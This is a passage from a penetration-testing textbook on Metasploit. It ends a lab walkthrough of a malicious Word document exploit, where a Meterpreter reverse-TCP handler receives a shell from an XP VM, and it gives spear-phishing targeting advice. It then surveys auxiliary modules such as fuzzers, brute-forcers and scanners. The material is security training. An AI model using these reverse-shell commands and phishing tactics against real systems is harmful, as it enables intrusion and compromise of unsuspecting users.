8pt;padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">Our file was exported as <span class="s19">msf.doc </span><span class="s32">O </span>and sent to the <span class="s19">/opt/ </span><span class="s32">8 </span>directory within Metasploit. Now that we have our malicious document, we can craft up an</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">email to our target and hope the user opens it. At this point, we should already have an idea of the target’s patch levels and vulnerabilities. Before we actually open the document, we need to set up a multi-handler listener. This will ensure that when the exploit is triggered, the attacker machine can receive the connection back from the target machine (reverse payload).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_353.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(ms11_006_createsizeddibsection) &gt; <span class="s24">use multi/handler </span>msf exploit(handler) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp </span>payload =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set LHOST 172.16.32.128</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 172.16.32.128</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set LPORT 443</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 443</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">exploit -j</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Exploit running as background job.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 172.16.32.128:443 [*] Starting the payload handler...</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_354.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We open the document on a Windows XP virtual machine, and we should be presented with a shell (provided our VM is Windows XP SP3):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_355.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Sending stage (749056 bytes) to 172.16.32.131</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Meterpreter session 1 opened (172.16.32.128:443 -&gt; 172.16.32.131:2718) at</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Sun Apr 03 21:39:58 -0400 2011</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">sessions -i 1 </span>[*] Starting interaction with 1... meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_356.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We have successfully exploited a file format vulnerability by creating a malicious document through Metasploit and then sending it to our targeted user. Looking back at this exploit, if we had performed proper reconnaissance on our target user, we could have crafted a pretty convincing email. This exploit is one example of a number of file format exploits available in Metasploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark273">Wrapping Up</a><a name="bookmark283">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">We covered how client-side exploits generally work by manipulating the heap to work in the attacker’s favor. We covered how NOP instructions work within an attack and how to use the basics of a debugger. You’ll learn more about leveraging a debugger in Chapters 14 and 15. MS11-006 was a stack-based overflow, which we will cover in depth in later chapters. Note that your suc- cess rate with these types of attacks resides in how much information you gain about the target before you attempt to perform the attacks.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As a penetration tester, every bit of information can be used to craft an even better attack. In the case of spear-phishing, if you can talk the language of the company and target your attacks against smaller business units within the company that probably aren’t technical in nature, your chances of success greatly increase. Browser exploits and file format exploits are typically very effective, granted you do your homework. We’ll cover this topic in more detail in Chapters 8 and 10.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 231pt;text-indent: 0pt;text-align: left;"><span><img width="67" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_357.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 9pt;padding-left: 207pt;text-indent: -73pt;line-height: 87%;text-align: left;"><a name="bookmark284">METASPLOIT AUXILIARY MODULES </a><a name="bookmark288">&zwnj;</a><a name="bookmark289">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">When most people think of Metasploit, exploits come to mind. Exploits are cool, exploits get you shell, and exploits get all the attention. But sometimes you need something more than that. By definition, a Metasploit module that is not an exploit is an <span class="s38">auxiliary module</span>, which leaves a lot to the imagination.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In addition to providing valuable reconnaissance tools such as port scanners and service fingerprinters, auxiliary modules such as <span class="s19">ssh_login </span>can take a known list of usernames and passwords and then attempt to log in via brute force across an entire target network. Also included in the auxiliary modules are various protocol fuzzers such as <span class="s19">ftp_pre_post</span>, <span class="s19">http_get_uri_long</span>, <span class="s19">smtp_fuzzer</span>, <span class="s19">ssh_version_corrupt</span>, and more. You can launch these fuzzers at a target service in hopes of finding your own vulnerabilities to exploit.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Just because auxiliary modules don’t have a payload, don’t think you won’t use them. But before we dive into their myriad uses, here’s an overview to help you see what we are dealing with.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_358.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">root@bt:/opt/framework3/msf3/modules/auxiliary# </span><span class="s24">ls –l</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">total 52</p><table style="border-collapse:collapse;margin-left:90.5pt" cellspacing="0"><tr style="height:10pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">23</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">Apr</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">10</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">03:22</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">admin</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">4</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Dec</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">14</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">03:25</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">client</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">16</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Jan</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">1</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">04:19</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">dos</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">8</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Dec</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">14</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">03:25</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fuzzers</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">3</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">May</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15:38</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">gather</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">4</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Dec</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">14</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">03:25</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">pdf</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">36</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Apr</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">10</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">03:22</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">scanner</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">5</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">May</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15:38</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">server</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">3</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">May</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15:38</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sniffer</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">5</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Dec</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">14</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">03:25</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">spoof</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">4</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">Dec</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">14</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">03:25</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sqli</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">3</p></td><td style="width:22pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">May</p></td><td style="width:13pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2</p></td><td style="width:25pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15:38</p></td><td style="width:157pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">test</p></td></tr><tr style="height:14pt"><td style="width:45pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">drwxr-xr-x</p></td><td style="width:12pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">3</p></td><td style="width:22pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">root</p></td><td style="width:21pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p></td><td style="width:21pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4096</p></td><td style="width:17pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">May</p></td><td style="width:13pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2</p></td><td style="width:25pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15:38</p></td><td style="width:157pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">voip</p></td></tr></table><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">As you can see in the preceding listing, modules are installed within the</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;"><span class="s19">/modules/auxiliary </span>directory <span class="s32">O </span>of the Framework, and within that, sorted based on the functions they provide. Should you want to create your own</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">module or edit an existing one to suit a specific purpose, you will find them in their corresponding directories. For instance, if you need to develop a fuzzer module to hunt your own bugs, you will find some pre-existing mod- ules in the <span class="s19">/fuzzers </span>directory.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">To list all the available auxiliary modules within Metasploit, simply issue the <span class="s24">show auxiliary </span>command <span class="s32">O </span>within <span class="s19">msfconsole</span>. If you compare the preceding directory listing with the module names displayed in <span class="s19">msfconsole</span>, you will notice</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">that the naming of the modules depends on the underlying directory struc- ture, as shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_359.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">msf &gt; </span><span class="s24">show auxiliary</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Auxiliary</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:46.7195pt" cellspacing="0"><tr style="height:10pt"><td style="width:128pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:72pt"><p class="s28" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:158pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:128pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:72pt"><p class="s28" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:158pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:10pt"><td style="width:128pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">admin/backupexec/dump</p></td><td style="width:72pt"><p class="s28" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:158pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Veritas Backup Exec Windows Remote</p></td></tr></table><p class="s25" style="padding-left: 49pt;text-indent: 216pt;text-align: left;">File Access admin/backupexec/registry normal Veritas Backup Exec Server Registry</p><p class="s25" style="padding-left: 266pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Access</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">admin/cisco/ios_http_auth_bypass normal Cisco IOS HTTP Unauthorized</p><p class="s25" style="padding-left: 266pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Administrative Access</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">fuzzers/ssh/ssh_version_corrupt normal SSH Version Corruption fuzzers/tds/tds_login_corrupt normal TDS Protocol Login Request Corruption</p><p class="s25" style="padding-left: 266pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Fuzzer</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fuzzers/tds/tds_login_username normal TDS Protocol Login Request Username</p><p class="s25" style="padding-left: 49pt;text-indent: 216pt;text-align: left;">Fuzzer fuzzers/wifi/fuzz_beacon normal Wireless Beacon Frame Fuzzer</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">fuzzers/wifi/fuzz_proberesp normal Wireless Probe Response Frame Fuzzer</p><p class="s25" style="padding-top: 3pt;padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">gather/citrix_published_applications normal Citrix MetaFrame ICA Published</p><p class="s25" style="padding-left: 49pt;text-indent: 216pt;text-align: left;">Applications Scanner gather/citrix_published_bruteforce normal Citrix MetaFrame ICA Published</p><p class="s25" style="padding-left: 266pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Applications Bruteforcer</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">gather/dns_enum normal DNS Enumeration Module gather/search_email_collector normal Search Engine Domain Email Address</p><p class="s25" style="padding-left: 266pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Collector</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">pdf/foxit/authbypass normal Foxit Reader Authorization Bypass scanner/backdoor/energizer_duo_detect normal Energizer DUO Trojan Scanner scanner/db2/db2_auth normal DB2 Authentication Brute Force Utility</p><p class="s25" style="padding-bottom: 4pt;padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/db2/db2_version normal DB2 Probe Utility</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_360.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you can see in this trimmed output, the auxiliary modules are orga- nized by category. At your disposal are the DNS enumeration module, Wi-Fi fuzzers, and even a module to locate and abuse the Trojan backdoor that was included on Energizer USB battery chargers.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Using an auxiliary module is similar to using any exploit within the Framework—simply issue the <span class="s25">use </span>command followed by the module name. For example, to use the <span class="s19">webdav_scanner </span><a href="#bookmark290" class="s31">module (explored in “Auxiliary Mod- </a>ules in Use” on page 126), you would run <span class="s25">use scanner/http/webdav_scanner </span>as shown below.</p><p class="s19" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span>In auxiliary modules, the basic options are slightly different with an <span class="s35">RHOSTS </span>option to tar- get multiple machines and a <span class="s35">THREADS </span>value to fine-tune the speed of your scanning.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_361.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">msf &gt; </span><span class="s24">use scanner/http/webdav_scanner</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8 <span class="s25">msf auxiliary(webdav_scanner) &gt; </span><span class="s24">info</span></p><p style="text-indent: 0pt;text-align: 